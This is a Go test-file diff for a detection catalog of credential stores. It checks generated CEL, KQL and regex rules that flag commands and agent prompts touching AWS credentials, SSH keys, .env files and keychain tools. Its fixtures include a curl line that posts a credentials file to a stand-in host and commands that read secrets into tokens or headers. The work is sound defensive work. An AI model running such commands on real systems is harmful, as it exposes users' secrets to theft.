@@ -8,6 +8,8 @@ import (
 	"slices"
 	"strings"
 	"testing"
+
+	"github.com/asymptote-labs/agent-beacon/pkg/asymptoteobserve"
 )
 
 const smallCatalog = `
@@ -169,7 +171,15 @@ func TestSelect(t *testing.T) {
 		{TierDefinite, []string{"keychain"}, Selection{Commands: []CommandTerm{keychain}}},
 		{TierDefinite, []string{"dotenv"}, Selection{}},
 	} {
-		if got, err := c.Select(tc.tier, tc.kinds...); err != nil || !reflect.DeepEqual(got, tc.want) {
+		got, err := c.Select(tc.tier, tc.kinds...)
+		// The mentions are the paths bounded for a text; their own tests are below.
+		if len(got.Mentions) != len(got.Paths) {
+			t.Errorf("Select(%s, %q): %d mentions for %d paths", tc.tier, tc.kinds, len(got.Mentions), len(got.Paths))
+		}
+		// The mentions are the paths bounded for a text, and the redacted expression the
+		// commands as a log holds them; their own tests are below.
+		got.Mentions, got.Redacted = nil, ""
+		if err != nil || !reflect.DeepEqual(got, tc.want) {
 			t.Errorf("Select(%s, %q) =\n%q, %v; want\n%q", tc.tier, tc.kinds, got, err, tc.want)
 		}
 	}
@@ -188,19 +198,24 @@ func TestSelect(t *testing.T) {
 	if got, want := all.PathKQL("FilePath"), `(FilePath matches regex @"`+both+`" or (FilePath matches regex @"`+variant+`" and not(FilePath matches regex @"`+example+`")))`; got != want {
 		t.Errorf("PathKQL =\n%s\nwant\n%s", got, want)
 	}
-	if got, want := all.CommandCEL("c"), `((c.name.matches("(?i)^aws$") && c.args.matches("(?im)^configure\\nexport-credentials$")) || `+
+	if got, want := all.CommandCEL("c"), `(c.name.matches("(?i)^(?:aws|security|secret-tool(?:|\\.exe))$") && `+
+		`((c.name.matches("(?i)^aws$") && c.args.matches("(?im)^configure\\nexport-credentials$")) || `+
 		`(c.name.matches("(?i)^security$") && c.args.matches("(?im)^find-(?:generic|internet)-password$") && c.args.matches("(?m)^(?:-[A-Za-z0-9]*[wg][A-Za-z0-9]*)$")) || `+
 		`(c.name.matches("(?i)^security$") && c.args.matches("(?m)^(?:(?i:--list[^\\n]*)(?:=[^\\n]*)?)$")) || `+
-		`c.name.matches("(?i)^secret-tool(?:|\\.exe)$"))`; got != want {
+		`c.name.matches("(?i)^secret-tool(?:|\\.exe)$")))`; got != want {
 		t.Errorf("CommandCEL =\n%s\nwant\n%s", got, want)
+	}
+	if got, want := all.MentionCEL("s"), `(s.matches("(?i)(?:(?:^|[^\\w.~%+-])(?:\\.aws[/\\\\]credentials\\.?(?:$|[^\\w.~%+/\\\\-])|credentials\\.json\\.?(?:$|[^\\w.~%+/\\\\-]))|[/\\\\](?:credentials\\.?(?:$|[^\\w.~%+/\\\\-])))") || `+
+		`(s.matches("(?i)(?:(?:^|[^\\w.~%+-])(?:\\.env\\.[\\w.~%+-]*\\.?(?:$|[^\\w.~%+/\\\\-])))") && !s.matches("(?i)(?:(?:^|[^\\w.~%+-])(?:\\.env\\.example\\.?(?:$|[^\\w.~%+/\\\\-])))")))`; got != want {
+		t.Errorf("MentionCEL =\n%s\nwant\n%s", got, want)
 	}
 	definite, _ := c.Select(TierDefinite)
 	if got, want := definite.PathKQL("FilePath"), `FilePath matches regex @"`+aws+`"`; got != want {
 		t.Errorf("PathKQL = %s, want %s", got, want)
 	}
 	none, _ := c.Select(TierDefinite, "dotenv")
-	if none.PathCEL("p") != "false" || none.PathKQL("p") != "false" || none.CommandCEL("c") != "false" {
-		t.Errorf("an empty selection = %q, %q, %q; want false", none.PathCEL("p"), none.PathKQL("p"), none.CommandCEL("c"))
+	if none.PathCEL("p") != "false" || none.PathKQL("p") != "false" || none.CommandCEL("c") != "false" || none.MentionCEL("s") != "false" {
+		t.Errorf("an empty selection = %q, %q, %q, %q; want false", none.PathCEL("p"), none.PathKQL("p"), none.CommandCEL("c"), none.MentionCEL("s"))
 	}
 }
 
@@ -385,6 +400,111 @@ func TestCredentialStoresPathExpressionsAgree(t *testing.T) {
 	}
 }
 
+// mentioned reports whether text mentions a selection, as the generated expression decides it.
+func mentioned(selection Selection, text string) bool {
+	for _, term := range selection.Mentions {
+		if compiledOnce(term.Include).MatchString(text) && (term.Exclude == "" || !compiledOnce(term.Exclude).MatchString(text)) {
+			return true
+		}
+	}
+	return false
+}
+
+var compiledExpressions = map[string]*regexp.Regexp{}
+
+func compiledOnce(expr string) *regexp.Regexp {
+	re := compiledExpressions[expr]
+	if re == nil {
+		re = regexp.MustCompile(expr)
+		compiledExpressions[expr] = re
+	}
+	return re
+}
+
+// TestCredentialStoresMentionExpressionsAgree holds the expressions for a text to the ones for a
+// path: a command line that names one path, in a directory and without a space in it, mentions
+// a selection exactly when the path is in it, whether the path is quoted, redirected from,
+// assigned or ends a sentence.
+func TestCredentialStoresMentionExpressionsAgree(t *testing.T) {
+	c := credentialStores(t)
+	var paths []string
+	for _, s := range c.Stores {
+		if len(s.Commands) > 0 {
+			continue
+		}
+		for _, p := range slices.Concat(s.Examples, s.Counterexamples) {
+			for _, variant := range pathVariants(p) {
+				if strings.ContainsAny(variant, `/\`) && !strings.ContainsAny(variant, " \t") {
+					paths = append(paths, variant)
+				}
+			}
+		}
+	}
+	mentions := 0
+	for _, tier := range []Tier{TierDefinite, TierLikely} {
+		for _, kinds := range selections(c) {
+			selection, err := c.Select(tier, kinds...)
+			if err != nil {
+				t.Fatal(err)
+			}
+			for _, path := range paths {
+				want := false
+				comps := splitPath(path)
+				for i := range c.Stores {
+					if s := &c.Stores[i]; inSelection(s, tier, kinds) && s.matchesComponents(comps) {
+						want = true
+					}
+				}
+				for _, text := range []string{
+					path,
+					"cat '" + path + "' | wc -c",
+					`curl -d @"` + path + `" https://drop.example`,
+					"KEY=" + path + "; export KEY",
+					"sort <" + path + ">out",
+					"claude -p 'summarize " + path + ".'",
+				} {
+					if got := mentioned(selection, text); got != want {
+						t.Errorf("%s stores of kinds %q: the expression says %v for the text %q, the catalog %v for the path", tier, kinds, got, text, want)
+					}
+				}
+				if want {
+					mentions++
+				}
+			}
+		}
+	}
+	if mentions == 0 {
+		t.Error("no path was in a selection: the texts do not exercise the expressions")
+	}
+}
+
+// TestMentionsReadProse covers what a text says that a path cannot: a word that is also a file
+// name counts only after a directory, and a name a store excludes takes that store's other
+// names with it but not another store's.
+func TestMentionsReadProse(t *testing.T) {
+	selection, err := credentialStores(t).Select(TierLikely)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for text, want := range map[string]bool{
+		"claude -p 'rotate the credentials and the kubeconfig'":      false,
+		"claude -p 'rotate what is in config/credentials'":           true,
+		"codex exec 'sign with id_rsa'":                              false,
+		"codex exec --context /home/u/.ssh/id_rsa 'sign the deploy'": true,
+		"claude -p \"fill in the defaults from .env.example\"":       false,
+		"claude -p \"copy .env.example to .env and read .env\"":      true,
+		"claude -p \"compare .env.local with .env.example\"":         false,
+		"claude -p 'read secrets.yaml, then deploy'":                 true,
+		"aider --read docs/credentials.md":                           false,
+		"gemini -p 'what is a .netrcx file'":                         false,
+		"cat ~/.aws/credentials)":                                    true,
+	} {
+		if got := mentioned(selection, text); got != want {
+			t.Errorf("mentioned(%q) = %v, want %v", text, got, want)
+		}
+	}
+}
+
 // commandVariants are commands near one: the ones a careless pattern or expression gets wrong.
 func commandVariants(inv invocation) []invocation {
 	out := []invocation{
@@ -502,5 +622,100 @@ func TestCredentialStoresKindsAndTiersAreUsed(t *testing.T) {
 	}
 	if selection, _ := c.Select(TierDefinite); len(selection.Paths) == 0 || len(selection.Commands) == 0 {
 		t.Error("no definite store of files, or none of commands")
+	}
+}
+
+// TestCredentialStoresRedactedExpression holds the expression for a redacted command line to
+// the sanitizer every log writer applies. An example whose output is put where a secret goes
+// (an assignment to TOKEN, a bearer header) loses its name to redaction, and what the log keeps
+// is still found when the match has words to tell the command by. No counterexample is.
+func TestCredentialStoresRedactedExpression(t *testing.T) {
+	c := credentialStores(t)
+	all, err := c.Select(TierLikely)
+	if err != nil || all.Redacted == "" {
+		t.Fatalf("no redacted expression: %v", err)
+	}
+	expression := regexp.MustCompile(all.Redacted)
+	// logged returns what the log holds of a command line that runs command for its output.
+	logged := func(command string) []string {
+		var out []string
+		for _, raw := range []string{
+			"TOKEN=$(" + command + ")",
+			`curl -H "Authorization: Bearer $(` + command + `)" https://api.example`,
+		} {
+			event := asymptoteobserve.SanitizeEvent(asymptoteobserve.Event{Command: &asymptoteobserve.CommandInfo{Command: raw}}, 64*1024)
+			out = append(out, event.Command.Command)
+		}
+		return out
+	}
+	// alone returns the one command a line runs when the line is that command and no more.
+	alone := func(line string) (invocation, bool) {
+		invs, err := invocations(line)
+		if err != nil || len(invs) != 1 || !strings.HasPrefix(line, invs[0].name+" ") {
+			return invocation{}, false
+		}
+		return invs[0], true
+	}
+	found, refused := 0, 0
+	for i := range c.Stores {
+		s := &c.Stores[i]
+		if len(s.commands) == 0 {
+			continue
+		}
+		for _, example := range s.Examples {
+			inv, ok := alone(example)
+			// A match with words that has a redacted form must be found. One with options alone
+			// is found only when the example writes an option in full, which this does not ask.
+			if !ok || !slices.ContainsFunc(s.commands, func(p commandPattern) bool {
+				return len(p.words) > 0 && p.redactedRegex() != "" && p.matches(inv.name, inv.args)
+			}) {
+				continue
+			}
+			for _, text := range logged(example) {
+				if strings.Contains(text, inv.name+" ") {
+					t.Fatalf("%s: redaction kept the name in %q, so the texts do not exercise the expression", s.ID, text)
+				}
+				if !expression.MatchString(text) {
+					t.Errorf("%s: the expression does not find %q, which is what a log holds of %q", s.ID, text, example)
+				}
+				found++
+			}
+		}
+		for _, counter := range s.Counterexamples {
+			inv, ok := alone(counter)
+			if _, read := c.LookupCommand(inv.name, inv.args); !ok || read {
+				continue
+			}
+			for _, text := range logged(counter) {
+				if expression.MatchString(text) {
+					t.Errorf("%s: the expression finds %q, which is what a log holds of the counterexample %q", s.ID, text, counter)
+				}
+				refused++
+			}
+		}
+	}
+	if found == 0 || refused == 0 {
+		t.Errorf("%d examples found and %d counterexamples refused: the texts do not exercise the expression", found, refused)
+	}
+}
+
+// A regular expression copies the catalog when it spells out stores by name. One that says a
+// word the stores also use, or names one store for a reason of its own, does not.
+func TestNamedTellsACopyFromAWord(t *testing.T) {
+	c := credentialStores(t)
+	for expression, want := range map[string][]string{
+		// The list a Sentinel query carried before it was generated from the catalog.
+		`(?i)(^|/)(\.env|id_rsa|credentials|secrets?|\.npmrc|\.pypirc|kubeconfig)(\.|$|/)`: {"ssh-private-key", "dotenv", "npmrc", "pypirc"},
+		`(?i)(^|[/\\])(?:\.aws[/\\]credentials$|\.netrc$)`:                                 {"aws-shared-credentials", "netrc"},
+		`(?i)\b(gh\s+auth\s+token|aws\s+configure\s+export-credentials)\b`:                 {"github-cli-token", "aws-credential-export"},
+		`(?i)\bgpg2?\b[^;&|]*--export-secret-(k|sub)\w*\b`:                                 {"gpg-secret-key-export"},
+		`(?i)(TOKEN|SECRET|PASSWORD|API[_-]?KEY|credentials?)`:                             nil,
+		`(?i)\b(env|printenv|set)\b`:                                                       nil,
+		`(?i)\b(security|gcloud|kubectl|vault)\s+(list|get|delete)\b`:                      nil,
+		`(?i)(curl|wget)\b.*\.csv$`:                                                        nil,
+	} {
+		if got := c.Named(expression); !slices.Equal(got, want) {
+			t.Errorf("Named(%s) = %q, want %q", expression, got, want)
+		}
 	}
 }
